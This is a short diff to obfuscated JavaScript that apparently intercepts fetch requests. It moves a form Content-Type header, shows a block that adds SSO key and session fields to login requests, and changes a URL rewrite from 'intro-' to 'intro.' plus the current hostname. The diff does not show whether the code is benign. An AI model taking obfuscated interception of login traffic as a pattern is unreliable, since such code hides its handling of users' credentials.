@@ -526,6 +526,8 @@ if (location.protocol === "http:") {
                 referrer: _0x5e0511.referrer,
                 duplex: "half",
             };
+
+            _0x2efb4d.headers.set("Content-Type", "application/x-www-form-urlencoded");
         }
         if (_0x125b1f.indexOf("sso-login.api") > 0x0) {
             const _0x466a19 = new URLSearchParams(_0x2efb4d.body);
@@ -533,7 +535,6 @@ if (location.protocol === "http:") {
             _0x466a19.append("ssoKey", _0x276df2("ssoKey"));
             _0x466a19.append("ssoSess", btoa(btoa(btoa(Date.now() + ""))));
             _0x2efb4d.body = _0x466a19.toString();
-            _0x2efb4d.headers.set("Content-Type", "application/x-www-form-urlencoded");
         }
         const _0x2c14a0 = _0x5e0511 instanceof Request ? new Request(_0x125b1f, _0x2efb4d) : null;
 
@@ -583,9 +584,9 @@ if (location.protocol === "http:") {
             }
             case "https:": {
                 if (_0x1536f8 && _0x3c78dc) {
-                    _0x1eddbb = _0x1eddbb.replaceAll(/\/\/[^/]*/g, "//intro-" + window.location.hostname);
+                    _0x1eddbb = _0x1eddbb.replaceAll(/\/\/[^/]*/g, "//intro." + window.location.hostname);
                 } else {
-                    _0x1eddbb = _0x1eddbb.replaceAll(/\/\/[^/]*/g, "//intro-" + window.location.hostname);
+                    _0x1eddbb = _0x1eddbb.replaceAll(/\/\/[^/]*/g, "//intro." + window.location.hostname);
                 }
                 break;
             }
